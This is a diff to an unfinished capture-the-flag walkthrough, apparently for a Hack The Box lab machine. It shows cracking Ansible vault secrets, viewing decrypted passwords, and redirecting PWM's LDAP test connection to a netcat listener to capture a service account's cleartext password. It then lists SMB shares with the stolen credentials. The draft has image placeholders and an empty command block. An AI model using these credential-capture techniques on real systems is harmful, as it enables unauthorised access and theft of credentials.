@@ -295,6 +295,9 @@ ldap_admin_password: !vault |
           3238343230333633350a646664396565633037333431626163306531336336326665316430613566
           3764
 ```
+## User foothold 
+
+### Cracking the vault secrets
 The values we are after seem to be contained in an encrypted Ansible vault. 
 To extract the contents of these vaults, we need to find the secret used to encrypt them
 We can use the ```ansible2john.py``` tool to convert the encrypted blobs into a hash format [hashcat](https://hashcat.net/hashcat/) can use to crack the secret.
@@ -359,8 +362,78 @@ You can install this tool using pip.
 ```console
 0ph3@parrot~$ pip3 install ansible-vault
 ```
-## User foothold svc_ldap
+Once installed, run the following command to extract the contents of each vault
+```console
+0ph3@parrot~$ ansible-vault view pwm_admin_login 
+Vault password: 
+svc_pwm
+0ph3@parrot~$ ansible-vault view pwm_admin_password 
+Vault password: 
+pWm_@dm!N_!23
+0ph3@parrot~$ ansible-vault view ldap_admin_password 
+Vault password: 
+DevT3st@123
+```
+### Retrieving svc_ldap's credentials
+Using the password ```pWm_@dm!N_!23``` grants us access to the PWM Configuration editor.
+Add image of  logging in
+Looking around the application doesn't leak any sensitive information but there is an option to test the ldap connection and change the target ldap url which is interesting.
+add image of functionality
+It's likely credentials are sent from the server when trying to establish the ldap connection to the target url. This means we could potentially intercept them if we set the url to our attacker machine.
+let's start by setting up our netcat listener
+```console
+0ph3@parrot~$ nc -nvlp 389
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::389
+Ncat: Listening on 0.0.0.0:389
+```
+Next we will change the ldap url to point to our attacker machine.
+changing the url image
 
+After clicking ```Test LDAP Profile``` we receive scredentials for the ```svc_ldap``` domain user on our ```netcat``` listener.
+```console
+0ph3@parrot~$  nc -nvlp 389
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::389
+Ncat: Listening on 0.0.0.0:389
+Ncat: Connection from 10.10.11.222.
+Ncat: Connection from 10.10.11.222:56536.
+0Y`T;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htblDaP_1n_th3_cle4r!0P
+```
+```info
+When specifying the ldap url, make sure to switch the protocol from ```ldaps://``` to ```ldap://``` otherwise the ldap request we recieve will be encrypted and can break your terminal session.
+```
+```console
+0ph3@parrot~$ nc -nvlp 636
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::636
+Ncat: Listening on 0.0.0.0:636
+Ncat: Connection from 10.10.11.222.
+Ncat: Connection from 10.10.11.222:56551.
+nj$f[2%`{kd.jS% [쐪/TF!;{ܟdb,+̩0̨/̪$(#'kjg@.2-1&*%)
+<SNIP>
+```
+We can use the credentials to connect to the DC through winrm and retrieve the user flag
+```console
 
+```
+
+The ldap_svc user seems to also have access to the Department Shares
+```console
+┌─[root@parrot]─[/home/orph3u5]
+└──╼ #cme smb authority.htb -d authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!' --shares 
+SMB         authority.htb   445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
+SMB         authority.htb   445    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
+SMB         authority.htb   445    AUTHORITY        [*] Enumerated shares
+SMB         authority.htb   445    AUTHORITY        Share           Permissions     Remark
+SMB         authority.htb   445    AUTHORITY        -----           -----------     ------
+SMB         authority.htb   445    AUTHORITY        ADMIN$                          Remote Admin
+SMB         authority.htb   445    AUTHORITY        C$                              Default share
+SMB         authority.htb   445    AUTHORITY        Department Shares READ            
+SMB         authority.htb   445    AUTHORITY        Development     READ            
+SMB         authority.htb   445    AUTHORITY        IPC$            READ            Remote IPC
+SMB         authority.htb   445    AUTHORITY        NETLOGON        READ            Logon server share 
+SMB         authority.htb   445    AUTHORITY        SYSVOL          READ            Logon server share 
+```
 
 
